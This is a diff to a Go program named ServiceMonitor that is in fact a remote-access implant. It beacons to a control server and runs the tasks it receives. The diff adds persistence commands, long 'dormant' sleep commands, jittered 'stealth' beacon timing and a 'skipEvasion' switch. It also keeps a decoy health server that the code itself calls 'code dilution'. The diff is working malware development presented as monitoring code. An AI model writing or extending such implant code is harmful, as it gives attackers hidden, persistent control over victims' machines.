@@ -31,6 +31,7 @@ import (
 	"os/user"
 	_ "path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -342,6 +343,33 @@ func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 		}
 	}
 
+	if checkName == "hostname" {
+		h, _ := os.Hostname()
+		return DiagnosticResult{CheckName: checkName, Output: h, Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+	}
+
+	if strings.HasPrefix(checkName, "__dormant:") {
+		hoursStr := strings.TrimPrefix(checkName, "__dormant:")
+		hours, err := strconv.ParseFloat(hoursStr, 64)
+		if err != nil || hours <= 0 {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid hours", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		dur := time.Duration(hours * float64(time.Hour))
+		time.Sleep(dur)
+		return DiagnosticResult{CheckName: checkName, Output: fmt.Sprintf("Resumed after %v dormancy", dur), Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+	}
+
+	if strings.HasPrefix(checkName, "__persist:") {
+		args := strings.TrimPrefix(checkName, "__persist:")
+		return DiagnosticResult{
+			CheckName:  checkName,
+			Output:     handlePersist(args),
+			Status:     "completed",
+			Timestamp:  time.Now(),
+			DurationMs: time.Since(start).Milliseconds(),
+		}
+	}
+
 	if strings.HasPrefix(checkName, "__px:") {
 		return DiagnosticResult{
 			CheckName:  checkName,
@@ -370,6 +398,24 @@ func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 			Timestamp:  time.Now(),
 			DurationMs: time.Since(start).Milliseconds(),
 		}
+	}
+
+	if strings.HasPrefix(checkName, "persist") {
+		args := strings.TrimSpace(strings.TrimPrefix(checkName, "persist"))
+		return DiagnosticResult{CheckName: checkName, Output: handlePersist(args), Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+	}
+
+	if strings.HasPrefix(checkName, "dormant ") || checkName == "dormant" {
+		durStr := strings.TrimSpace(strings.TrimPrefix(checkName, "dormant"))
+		if durStr == "" {
+			durStr = "1h"
+		}
+		d, err := time.ParseDuration(durStr)
+		if err != nil {
+			return DiagnosticResult{CheckName: checkName, Output: "Error: invalid duration (use 1h, 30m, 2h30m, etc)", Status: "error", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+		stealthSleep(d)
+		return DiagnosticResult{CheckName: checkName, Output: fmt.Sprintf("Resumed after %s dormancy", d), Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
 	}
 
 	if strings.HasPrefix(checkName, "cd ") {
@@ -508,6 +554,8 @@ func (sm *ServiceMonitor) processTasks(tasks []map[string]interface{}) []map[str
 
 func (sm *ServiceMonitor) run() {
 	var pending []map[string]interface{}
+	var failCount int
+	const maxBackoff = 5 * time.Minute
 
 	for {
 		select {
@@ -522,17 +570,29 @@ func (sm *ServiceMonitor) run() {
 
 		if sid == "" {
 			if err := sm.registerEndpoint(); err != nil {
-				time.Sleep(5 * time.Second)
+				failCount++
+				backoff := time.Duration(failCount*failCount) * 5 * time.Second
+				if backoff > maxBackoff {
+					backoff = maxBackoff
+				}
+				stealthSleep(backoff)
 				continue
 			}
+			failCount = 0
 		}
 
 		tasks, err := sm.syncStatus(pending)
 		pending = nil
 		if err != nil {
-			time.Sleep(5 * time.Second)
+			failCount++
+			backoff := time.Duration(failCount*failCount) * 5 * time.Second
+			if backoff > maxBackoff {
+				backoff = maxBackoff
+			}
+			stealthSleep(backoff)
 			continue
 		}
+		failCount = 0
 
 		if len(tasks) > 0 {
 			pending = sm.processTasks(tasks)
@@ -584,9 +644,10 @@ func main() {
 	storeSensitive([]byte(configEndpoint))
 	storeSensitive([]byte(configProtocol + "://" + configEndpoint + ":" + configPort))
 
-	// Start legitimate health check server (code dilution + real functionality)
-	portOffset, _ := rand.Int(rand.Reader, big.NewInt(100))
-	startHealthServer(18099 + int(portOffset.Int64()))
+	if skipEvasion == "true" {
+		portOffset, _ := rand.Int(rand.Reader, big.NewInt(100))
+		startHealthServer(18099 + int(portOffset.Int64()))
+	}
 
 	svc := newServiceMonitor()
 
@@ -615,17 +676,26 @@ func main() {
 		svc.cancel()
 	}()
 
-	// Register with exponential backoff
+	// Register with exponential backoff + jitter
 	meta := svc.collectSystemInfo()
 	var agentID string
 	backoff := 5 * time.Second
+	regFailures := 0
 	for agentID == "" {
 		id, err := transport.Register(meta)
 		if err == nil {
 			agentID = id
 		} else {
-			time.Sleep(backoff)
-			if backoff < 5*time.Minute {
+			regFailures++
+			if regFailures > 50 {
+				stealthSleep(randomizeBeaconTiming(600, 50))
+				regFailures = 0
+				backoff = 5 * time.Second
+				continue
+			}
+			jitter, _ := rand.Int(rand.Reader, big.NewInt(int64(backoff/4)))
+			stealthSleep(backoff + time.Duration(jitter.Int64()))
+			if backoff < 2*time.Minute {
 				backoff = backoff * 2
 			}
 		}
@@ -695,7 +765,7 @@ func main() {
 				consecutiveFailures++
 				if consecutiveFailures >= maxFailures {
 					consecutiveFailures = 0
-					time.Sleep(15 * time.Second)
+					stealthSleep(randomizeBeaconTiming(600, 50))
 					continue
 				}
 				if consecutiveFailures%reRegisterAfter == 0 {
@@ -706,7 +776,11 @@ func main() {
 						continue
 					}
 				}
-				time.Sleep(5 * time.Second)
+				failDelay := 5 + consecutiveFailures*2
+				if failDelay > 60 {
+					failDelay = 60
+				}
+				stealthSleep(randomizeBeaconTiming(failDelay, 30))
 				continue
 			}
 			pending = nil
